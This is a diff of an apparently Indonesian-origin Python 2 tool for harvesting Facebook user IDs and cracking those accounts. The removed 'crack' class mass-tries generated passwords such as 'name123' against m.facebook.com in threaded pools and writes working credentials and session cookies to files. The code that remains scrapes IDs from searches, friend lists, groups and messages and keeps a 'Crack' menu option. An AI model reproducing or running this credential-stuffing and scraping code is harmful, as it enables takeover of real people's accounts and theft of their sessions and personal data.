@@ -445,125 +445,13 @@ def generate(text):
     return results
 
 
-class crack:
-
-    def __init__(self, show=True):
-        self.ada = []
-        self.cp = []
-        self.ko = 0
-        if show == True:
-            print '\n\t[ SELECT AselectON ]\n'
-            print '  1. Crack With Manual Password Lists.'
-            print '  2. Auto Crack (name123,name12345)\n'
-        while True:
-            f = raw_input('? menu: ')
-            if f == '':
-                continue
-            elif f == '1':
-                try:
-                    while True:
-                        try:
-                            self.apk = raw_input('?: id list file: ')
-                            self.fs = open(self.apk).read().splitlines()
-                            break
-                        except Exception as e:
-                            print '!: %s' % e
-                            continue
-
-                    self.fl = []
-                    for i in self.fs:
-                        try:
-                            self.fl.append({'id': i.split('<=>')[0]})
-                        except:
-                            continue
-
-                except Exception as e:
-                    print '!: %s' % e
-                    continue
-
-                print '+ example pass123,pass12345'
-                self.pwlist()
-                s = subprocess.Popen(['killall', '-9', 'python2'], stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-                break
-            elif f == '2':
-                try:
-                    while True:
-                        try:
-                            self.apk = raw_input('?: id list file: ')
-                            self.fs = open(self.apk).read().splitlines()
-                            break
-                        except Exception as e:
-                            print '!: %s' % e
-                            continue
-
-                    self.fl = []
-                    for i in self.fs:
-                        try:
-                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
-                        except:
-                            continue
-
-                except Exception as e:
-                    print '!: %s' % e
-                    continue
-
-                print '!: crack started...'
-                print '+: account found saved to: multiresult.txt'
-                print '+: account checkpoint saved to: checkpoint.txt'
-                ThreadPool(50).map(self.main, self.fl)
-                os.remove(self.apk)
-                print '\n* finished.'
-                s = subprocess.Popen(['killall', '-9', 'python2'], stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
-                break
-
-    def pwlist(self):
-        self.pw = raw_input('?: password list: ').split(',')
-        if len(self.pw) == 0:
-            self.pwlist()
-        else:
-            for i in self.fl:
-                i.update({'pw': self.pw})
-
-            print '!: crack started...'
-            print '+: account found saved to: multiresult.txt'
-            print '+: account checkpoint saved to: checkpoint.txt'
-            ThreadPool(30).map(self.main, self.fl)
-            os.remove(self.apk)
-            print '\n+: finished.'
-
-    def main(self, fl):
-        try:
-            for i in fl.get('pw'):
-                log = login(fl.get('id'), i, 'https://m.facebook.com')
-                if log.get('status') == 'success':
-                    print G + '\r++ %s|%s ----> OK%s      ' % (fl.get('id'), i, N)
-                    self.ada.append('%s|%s' % (fl.get('id'), i))
-                    if fl.get('id') in open('multiresult.txt').read():
-                        break
-                    else:
-                        open('multiresult.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, cvs(log.get('cookies'))))
-                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, cvs(log.get('cookies')))
-                    break
-                elif log.get('status') == 'cp':
-                    print R + '\r-- %s|%s ----> CP%s      ' % (fl.get('id'), i, N)
-                    self.cp.append('%s|%s' % (fl.get('id'), i))
-                    open('cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
-                    break
-                else:
-                    continue
-
-            self.ko += 1
-            print '\r[Crack] %s/%s - found-:%s - cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
-            sys.stdout.flush()
-        except:
-            self.main(fl)
 
 
 def search(fl, r, b):
     open(fl, 'a+')
     b = bs4.BeautifulSoup(requests.get(b, cookies=r, headers=hdcok()).text, 'html.parser')
     for i in b.find_all('a', href=True):
-        print '\r[GET]: %s id... press ctrl+z for stop' % len(open(fl).read().splitlines()),
+        print ('\r[GET]: %s id... press ctrl+z for stop') % len(open(fl).read().splitlines()),
         sys.stdout.flush()
         if '<img alt=' in str(i):
             if 'home.php' in str(i['href']):
@@ -637,7 +525,7 @@ def dumpfl():
         except:
             pass
 
-        print '* login fail!'
+        print ('* login fail!')
         dumpfl()
     return
 
@@ -667,7 +555,7 @@ class lc:
         for i in range(20):
             id.append(random.choice([random.choice(abs), random.choice(abs).upper()]))
 
-        print '* your id: ' + ('').join(id)
+        print ('* your id: ') + ('').join(id)
         open(self.path, 'w').write(('').join(id))
         raw_input('* press enter to register or submit order..')
         exit(subprocess.Popen(['am', 'start',
@@ -677,8 +565,8 @@ class lc:
         r = requests.post(self.host.format('index.php?aselecton=cek'), data={'id': open(self.path).read().strip()})
         if r.json().get('status') == 'success':
             if r.json().get('result')['confirmed'] == 'false':
-                print '\t[ hello %s ]\n' % r.json().get('result')['name']
-                print '%s* your id: (%s) unconfirmed%s' % (G, open(self.path).read().strip(), N)
+                print ('\t[ hello %s ]\n') % r.json().get('result')['name']
+                print ('%s* your id: (%s) unconfirmed%s') % (G, open(self.path).read().strip(), N)
                 raw_input('* press enter to get confirmation.')
                 exit(subprocess.Popen([
                  'am', 'start',
@@ -686,7 +574,7 @@ class lc:
             else:
                 clear()
                 banner()
-                print '  + order: %s days, name- %s' % (r.json()['result']['license_limit'], r.json()['result']['name'])
+                print ('  + order: %s days, name- %s') % (r.json()['result']['license_limit'], r.json()['result']['name'])
                 if os.path.exists('.browser'):
                     if os.path.getsize('.browser') != 0:
                         pass
@@ -695,17 +583,15 @@ class lc:
                 else:
                     open('.browser', 'w').write(r.json()['result']['browser'])
                 if r.json()['result']['vip'] == 'true':
-                    print '  + days used: %s' % r.json()['tinggal']
-                    print '  + VIP: %syes%s' % (G, N)
-                    print '  ' + '=' * 40 + '\n'
+                    print ('  + days used: %s') % r.json()['tinggal']
+                    print ('  + VIP: %syes%s') % (G, N)
                 else:
-                    print '  + days used: %s' % r.json()['tinggal']
-                    print '  + VIP: %sno%s' % (R, N)
-                    print '  ' + '=' * 40 + '\n'
+                    print ('  + days used: %s') % r.json()['tinggal']
+                    print ('  + VIP: %sno%s') % (R, N)
         elif 'not found' in r.text:
             self.genid()
         else:
-            print '* error, %s' % r.json()['message']
+            print ('* error, %s') % r.json()['message']
             self.genid()
 
 
@@ -717,13 +603,13 @@ basecookie()
 clear()
 while True:
     print banner()
-    print '\x1b[0;39m'
-    print '  [1] Dump id By Search Name'
-    print '  [2] Dump id by Public Friendlist'
-    print '  [3] Dump id by Group'
-    print '  [4] Dump Id By Your Message List'
-    print '  [5] Crack'
-    print '  [6] move account.\n'
+    print ('\x1b[0;39m')
+    print ('  [1] Dump id By Search Name')
+    print ('  [2] Dump id by Public Friendlist')
+    print ('  [3] Dump id by Group')
+    print ('  [4] Dump Id By Your Message List')
+    print ('  [5] Crack')
+    print ('  [6] move account.\n')
     r = raw_input('?: select: ')
     if r == '':
         os.system('clear')
@@ -744,7 +630,4 @@ while True:
             os.remove('.cok')
             exit(basecookie())
         except Exception as e:
-            print '- error, session empty. %s' % e
-
-    else:
-        print '!: wrong input'
+            print ('- error, session empty. %s') % e
